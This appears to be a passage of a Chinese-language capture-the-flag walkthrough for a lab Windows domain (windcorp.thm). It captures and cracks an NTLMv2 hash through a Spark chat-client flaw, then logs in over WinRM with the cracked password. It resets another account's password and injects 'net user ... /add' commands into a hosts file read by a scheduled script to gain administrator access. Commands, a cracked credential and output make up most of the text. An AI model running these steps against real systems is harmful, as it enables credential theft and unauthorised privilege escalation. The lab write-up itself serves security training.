+<p>接着看另一个共享：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //<span class="hljs-variable">$TIP</span>/Shared -U lilyle<br>Enter WORKGROUP\lilyle<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Sat May 30 08:45:42 2020</span><br><span class="hljs-string">  ..                                  D        0  Sat May 30 08:45:42 2020</span><br><span class="hljs-string">  Flag 1.txt                          A       45  Fri May  1 23:32:36 2020</span><br><span class="hljs-string">  spark_2_8_3.deb                     A 29526628  Sat May 30 08:45:01 2020</span><br><span class="hljs-string">  spark_2_8_3.dmg                     A 99555201  Sun May  3 19:06:58 2020</span><br><span class="hljs-string">  spark_2_8_3.exe                     A 78765568  Sun May  3 19:05:56 2020</span><br><span class="hljs-string">  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 19:07:24 2020</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="Flag2-txt"><a href="#Flag2-txt" class="headerlink" title="Flag2.txt:"></a>Flag2.txt:</h6><p>spark是一个通信软件，该2.8.3被允许以类似HTLM外链图片的方式与聊天对象发送消息，配合responder可利用强制认证捕获到目标的NTLMv2哈希。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] Listening <span class="hljs-keyword">for</span> events...<br><br>[HTTP] NTLMv2 Client   : 10.10.121.103<br>[HTTP] NTLMv2 Username : WINDCORP\buse<br>[HTTP] NTLMv2 Hash     : buse::WINDCORP:6da1ec088e2f0ad5:C28F54DAB3F6B4C463F0D569BF59EC7E:0101000000000000D8858F47AF1CD801A099D85D31F3B105000000000200080042004A005900390001001E00570049004E002D0056005600580057003800380032003200530050004A000400140042004A00590039002E004C004F00430041004C0003003400570049004E002D0056005600580057003800380032003200530050004A002E0042004A00590039002E004C004F00430041004C000500140042004A00590039002E004C004F00430041004C000800300030000000000000000100000000200000DEAFDEAC9E1ACD2053A729447BC2415EBAF161709AD5EC89915C6DBE11D0B9DD0A00100000000000000000000000000000000000090000000000000000000000<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hashcat -m 5600 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt<br>BUSE::WINDCORP:6da1ec088e2f0ad5:c28f54dab3f6b4c463f0d569bf59ec7e:0101000000000000d8858f47af1cd801a099d85d31f3b105000000000200080042004a005900390001001e00570049004e002d0056005600580057003800380032003200530050004a000400140042004a00590039002e004c004f00430041004c0003003400570049004e002d0056005600580057003800380032003200530050004a002e0042004a00590039002e004c004f00430041004c000500140042004a00590039002e004c004f00430041004c000800300030000000000000000100000000200000deafdeac9e1acd2053a729447bc2415ebaf161709ad5ec89915c6dbe11d0b9dd0a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">buse</span>:uzunLM+<span class="hljs-number">3131</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb <span class="hljs-variable">$TIP</span>  -u buse -p <span class="hljs-string">&#x27;uzunLM+3131&#x27;</span><br>SMB         10.10.121.103   445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)<br>SMB         10.10.121.103   445    FIRE             [+] windcorp.thm\buse:uzunLM+3131<br>$ smbmap -H <span class="hljs-variable">$TIP</span> -u buse -p <span class="hljs-string">&#x27;uzunLM+3131&#x27;</span><br>[+] IP: 10.10.121.103:445	Name: windcorp.thm                                      <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	ADMIN$                                            	NO ACCESS	Remote Admin<br>	C$                                                	NO ACCESS	Default share<br>	IPC$                                              	READ ONLY	Remote IPC<br>	NETLOGON                                          	READ ONLY	Logon server share <br>	Shared                                            	READ ONLY	<br>	SYSVOL                                            	READ ONLY	Logon server share <br>	Users                                             	READ ONLY	<br>$ crackmapexec winrm <span class="hljs-variable">$TIP</span>  -u buse -p <span class="hljs-string">&#x27;uzunLM+3131&#x27;</span><br>WINRM       10.10.121.103   5985   FIRE             [*] Windows 10.0 Build 17763 (name:FIRE) (domain:windcorp.thm)<br>WINRM       10.10.121.103   5985   FIRE             [*] http://10.10.121.103:5985/wsman<br>WINRM       10.10.121.103   5985   FIRE             [+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i <span class="hljs-variable">$TIP</span> -u buse -p <span class="hljs-string">&#x27;uzunLM+3131&#x27;</span><br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\buse\Documents&gt; <span class="hljs-built_in">cd</span> ../Desktop<br>*Evil-WinRM* PS C:\Users\buse\Desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\buse\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----         5/7/2020   3:00 AM                Also stuff<br>d-----         5/7/2020   2:58 AM                Stuff<br>-a----         5/2/2020  11:53 AM             45 Flag 2.txt<br>-a----         5/1/2020   8:33 AM             37 Notes.txt<br><br><br>*Evil-WinRM* PS C:\Users\buse\Desktop&gt; <span class="hljs-built_in">cat</span> <span class="hljs-string">&quot;Flag 2.txt&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="Flag3-txt"><a href="#Flag3-txt" class="headerlink" title="Flag3.txt:"></a>Flag3.txt:</h6><p>在C:\script目录下有一个checkserver.ps1脚本。相对的还有一个log.txt用以记录该脚本上一次运行的时间：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\scripts&gt; <span class="hljs-built_in">cat</span> log.txt<br>Last run: <span class="hljs-number">07</span>/<span class="hljs-number">08</span>/<span class="hljs-number">2022</span> <span class="hljs-number">01</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\scripts&gt; <span class="hljs-built_in">cat</span> checkservers.ps1<br><span class="hljs-comment"># reset the lists of hosts prior to looping</span><br><span class="hljs-variable">$OutageHosts</span> = <span class="hljs-variable">$Null</span><br><span class="hljs-comment"># specify the time you want email notifications resent for hosts that are down</span><br><span class="hljs-variable">$EmailTimeOut</span> = <span class="hljs-number">30</span><br><span class="hljs-comment"># specify the time you want to cycle through your host lists.</span><br><span class="hljs-variable">$SleepTimeOut</span> = <span class="hljs-number">45</span><br><span class="hljs-comment"># specify the maximum hosts that can be down before the script is aborted</span><br><span class="hljs-variable">$MaxOutageCount</span> = <span class="hljs-number">10</span><br><span class="hljs-comment"># specify who gets notified</span><br><span class="hljs-variable">$notificationto</span> = <span class="hljs-string">&quot;brittanycr@windcorp.thm&quot;</span><br><span class="hljs-comment"># specify where the notifications come from</span><br><span class="hljs-variable">$notificationfrom</span> = <span class="hljs-string">&quot;admin@windcorp.thm&quot;</span><br><span class="hljs-comment"># specify the SMTP server</span><br><span class="hljs-variable">$smtpserver</span> = <span class="hljs-string">&quot;relay.windcorp.thm&quot;</span><br><br><span class="hljs-comment"># start looping here</span><br><span class="hljs-keyword">Do</span>&#123;<br><span class="hljs-variable">$available</span> = <span class="hljs-variable">$Null</span><br><span class="hljs-variable">$notavailable</span> = <span class="hljs-variable">$Null</span><br><span class="hljs-built_in">Write-Host</span> (<span class="hljs-built_in">Get-Date</span>)<br><br><span class="hljs-comment"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span><br><span class="hljs-comment"># from the list without touching the script/scheduled task,</span><br><span class="hljs-comment"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span><br><span class="hljs-built_in">get-content</span> C:\Users\brittanycr\hosts.txt | <span class="hljs-built_in">Where-Object</span> &#123;!(<span class="hljs-variable">$_</span> <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;#&quot;</span>)&#125; |<br><span class="hljs-built_in">ForEach-Object</span> &#123;<br>    <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Test-Connection -ComputerName <span class="hljs-variable">$_</span> -Count 1 -ea silentlycontinue&quot;</span><br>    <span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-variable">$p</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span>)<br>    &#123;<br>     <span class="hljs-comment"># if the Host is available then just write it to the screen</span><br>     <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Available host ---&gt; &quot;</span><span class="hljs-variable">$_</span> <span class="hljs-literal">-BackgroundColor</span> Green <span class="hljs-literal">-ForegroundColor</span> White<br>     [<span class="hljs-built_in">Array</span>]<span class="hljs-variable">$available</span> += <span class="hljs-variable">$_</span><br>    &#125;<br><span class="hljs-keyword">else</span><br>    &#123;<br>     <span class="hljs-comment"># If the host is unavailable, give a warning to screen</span><br>     <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Unavailable host ------------&gt; &quot;</span><span class="hljs-variable">$_</span> <span class="hljs-literal">-BackgroundColor</span> Magenta <span class="hljs-literal">-ForegroundColor</span> White<br>     <span class="hljs-variable">$p</span> = <span class="hljs-built_in">Test-Connection</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-variable">$_</span> <span class="hljs-literal">-Count</span> <span class="hljs-number">1</span> <span class="hljs-literal">-ea</span> silentlycontinue<br>     <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$p</span>))<br>       &#123;<br>        <span class="hljs-comment"># If the host is still unavailable for 4 full pings, write error and send email</span><br>        <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Unavailable host ------------&gt; &quot;</span><span class="hljs-variable">$_</span> <span class="hljs-literal">-BackgroundColor</span> Red <span class="hljs-literal">-ForegroundColor</span> White<br>        [<span class="hljs-built_in">Array</span>]<span class="hljs-variable">$notavailable</span> += <span class="hljs-variable">$_</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$OutageHosts</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$Null</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$OutageHosts</span>.ContainsKey(<span class="hljs-variable">$_</span>))<br>                &#123;<br>                 <span class="hljs-comment"># First time down add to the list and send email</span><br>                 <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;<span class="hljs-variable">$_</span> Is not in the OutageHosts list, first time down&quot;</span><br>                 <span class="hljs-variable">$OutageHosts</span>.Add(<span class="hljs-variable">$_</span>,(<span class="hljs-built_in">get-date</span>))<br>                 <span class="hljs-variable">$Now</span> = <span class="hljs-built_in">Get-date</span><br>                 <span class="hljs-variable">$Body</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$_</span> has not responded for 5 pings at <span class="hljs-variable">$Now</span>&quot;</span><br>                 <span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-Body</span> <span class="hljs-string">&quot;<span class="hljs-variable">$body</span>&quot;</span> <span class="hljs-literal">-to</span> <span class="hljs-variable">$notificationto</span> <span class="hljs-literal">-from</span> <span class="hljs-variable">$notificationfrom</span> `<br>                  <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;Host <span class="hljs-variable">$_</span> is down&quot;</span> <span class="hljs-literal">-SmtpServer</span> <span class="hljs-variable">$smtpserver</span><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment"># If the host is in the list do nothing for 1 hour and then remove from the list.</span><br>                    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;<span class="hljs-variable">$_</span> Is in the OutageHosts list&quot;</span><br>                    <span class="hljs-keyword">if</span> (((<span class="hljs-built_in">Get-Date</span>) - <span class="hljs-variable">$OutageHosts</span>.Item(<span class="hljs-variable">$_</span>)).TotalMinutes <span class="hljs-operator">-gt</span> <span class="hljs-variable">$EmailTimeOut</span>)<br>                    &#123;<span class="hljs-variable">$OutageHosts</span>.Remove(<span class="hljs-variable">$_</span>)&#125;<br>                &#125;<br>            &#125;<br>        <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-comment"># First time down create the list and send email</span><br>                <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Adding <span class="hljs-variable">$_</span> to OutageHosts.&quot;</span><br>                <span class="hljs-variable">$OutageHosts</span> = <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-variable">$_</span>=(<span class="hljs-built_in">get-date</span>)&#125;<br>                <span class="hljs-variable">$Body</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$_</span> has not responded for 5 pings at <span class="hljs-variable">$Now</span>&quot;</span><br>                <span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-Body</span> <span class="hljs-string">&quot;<span class="hljs-variable">$body</span>&quot;</span> <span class="hljs-literal">-to</span> <span class="hljs-variable">$notificationto</span> <span class="hljs-literal">-from</span> <span class="hljs-variable">$notificationfrom</span> `<br>                 <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;Host <span class="hljs-variable">$_</span> is down&quot;</span> <span class="hljs-literal">-SmtpServer</span> <span class="hljs-variable">$smtpserver</span><br>            &#125;<br>       &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment"># Report to screen the details</span><br><span class="hljs-variable">$log</span> = <span class="hljs-string">&quot;Last run: <span class="hljs-variable">$</span>(Get-Date)&quot;</span><br><span class="hljs-built_in">write-host</span> <span class="hljs-variable">$log</span><br><span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> C:\scripts\log.txt <span class="hljs-literal">-Value</span> <span class="hljs-variable">$log</span><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Available count:&quot;</span><span class="hljs-variable">$available</span>.count<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Not available count:&quot;</span><span class="hljs-variable">$notavailable</span>.count<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Not available hosts:&quot;</span><br><span class="hljs-variable">$OutageHosts</span><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Sleeping <span class="hljs-variable">$SleepTimeOut</span> seconds&quot;</span><br><span class="hljs-built_in">sleep</span> <span class="hljs-variable">$SleepTimeOut</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$OutageHosts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-variable">$MaxOutageCount</span>)<br>&#123;<br>    <span class="hljs-comment"># If there are more than a certain number of host down in an hour abort the script.</span><br>    <span class="hljs-variable">$Exit</span> = <span class="hljs-variable">$True</span><br>    <span class="hljs-variable">$body</span> = <span class="hljs-variable">$OutageHosts</span> | <span class="hljs-built_in">Out-String</span><br>    <span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-Body</span> <span class="hljs-string">&quot;<span class="hljs-variable">$body</span>&quot;</span> <span class="hljs-literal">-to</span> <span class="hljs-variable">$notificationto</span> <span class="hljs-literal">-from</span> <span class="hljs-variable">$notificationfrom</span> `<br>     <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;More than <span class="hljs-variable">$MaxOutageCount</span> Hosts down, monitoring aborted&quot;</span> <span class="hljs-literal">-SmtpServer</span> <span class="hljs-variable">$smtpServer</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$Exit</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$True</span>)<br></code></pre></td></tr></table></figure>
+
+<p>该脚本正在从C:\Users\brittanycr\hosts.txt读取非注释行去执行ping命令，可以进行命令注入。现在就想办法获取brittanycr账户权限即可，</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\scripts&gt; whoami /groups<br><br><span class="hljs-built_in">GROUP</span> INFORMATION<br><span class="hljs-literal">-----------------</span><br><br><span class="hljs-built_in">Group</span> Name                                       <span class="hljs-built_in">Type</span>             SID                                          Attributes<br>================================================ ================ ============================================ ==================================================<br>Everyone                                         Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-1-0</span>                                      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Users                                    Alias            S<span class="hljs-literal">-1-5-32-545</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Pre<span class="hljs-literal">-Windows</span> <span class="hljs-number">2000</span> Compatible Access       Alias            S<span class="hljs-literal">-1-5-32-554</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Account Operators                        Alias            S<span class="hljs-literal">-1-5-32-548</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Remote Desktop Users                     Alias            S<span class="hljs-literal">-1-5-32-555</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Remote Management Users                  Alias            S<span class="hljs-literal">-1-5-32-580</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NETWORK                             Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-2</span>                                      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\Authenticated Users                 Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-11</span>                                     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\This Organization                   Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-15</span>                                     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>WINDCORP\IT                                      <span class="hljs-built_in">Group</span>            S<span class="hljs-literal">-1-5-21-555431066-3599073733-176599750-5865</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NTLM Authentication                 Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-64-10</span>                                  Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>Mandatory Label\Medium Plus Mandatory Level      Label            S<span class="hljs-literal">-1-16-8448</span><br></code></pre></td></tr></table></figure>
+
+<p>Account Operators组可以更改域内其他账户的口令密码。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\buse\Documents&gt; net user brittanycr qwe123<span class="hljs-comment">#@! /domain</span><br>The command completed successfully.<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\buse\Document<br></code></pre></td></tr></table></figure>
+
+<p>构造hosts：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">;<span class="hljs-built_in">net</span> user crazy qwe123456! /add;<span class="hljs-built_in">net</span> localgroup Administrators crazy /add<br></code></pre></td></tr></table></figure>
+
+<p>然后用smb共享替换hosts：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> smbclient //<span class="hljs-number">10.10</span>.<span class="hljs-number">248.134</span>/Users <span class="hljs-literal">-U</span> brittanycr<br>Enter WORKGROUP\brittanycr<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string"></span><br><span class="hljs-string">smb: \&gt; cd brittanycr\</span><br><span class="hljs-string">smb: \brittanycr\&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Sun May  3 07:36:46 2020</span><br><span class="hljs-string">  ..                                  D        0  Sun May  3 07:36:46 2020</span><br><span class="hljs-string">  hosts.txt                           A       22  Sun May  3 21:44:57 2020</span><br><span class="hljs-string"></span><br><span class="hljs-string">		15587583 blocks of size 4096. 10912915 blocks available</span><br><span class="hljs-string">smb: \brittanycr\&gt; put hosts.txt</span><br><span class="hljs-string">hosts.txt does not exist</span><br><span class="hljs-string">smb: \brittanycr\&gt; put hosts.txt</span><br><span class="hljs-string">putting file hosts.txt as \brittanycr\hosts.txt (0.1 kb/s) (average 0.1 kb/s)</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\scripts&gt; net user crazy<br>User name                    crazy<br>Full Name<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            7/8/2022 3:19:52 AM</span><br><span class="hljs-string">Password expires             8/19/2022 3:19:52 AM</span><br><span class="hljs-string">Password changeable          7/9/2022 3:19:52 AM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Administrators</span><br><span class="hljs-string">Global Group memberships     *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\scripts&gt; </span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">248.134</span> <span class="hljs-literal">-u</span> crazy <span class="hljs-literal">-p</span> qwe123456!<br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">4</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\crazy\Documents&gt; <span class="hljs-built_in">cat</span> ../../administrator/desktop/Flag3.txt<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
